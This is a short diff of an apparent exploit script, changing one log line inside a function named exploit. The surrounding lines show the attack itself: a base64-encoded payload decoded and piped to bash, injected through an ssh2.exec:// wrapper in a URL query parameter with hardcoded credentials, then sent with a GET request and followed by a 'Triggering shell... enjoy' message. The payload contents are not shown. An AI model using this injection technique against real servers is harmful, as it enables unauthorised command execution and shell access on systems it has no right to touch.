@@ -188,7 +188,7 @@ def exploit(session, files, ip, port):
     cmd = f'echo {encoded_payload}|base64 -d|bash|'
 
     TARGET = f"{TARGET_URL}?id={file_id}&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/{cmd}"
-    logging.info(f"[+] Sending exploit to: {TARGET}")
+    logging.info(f"[+] Sending payload to: {TARGET}")
     r = session.get(TARGET, allow_redirects=True)
     
     logging.info(f"[+] Triggering shell... enjoy")
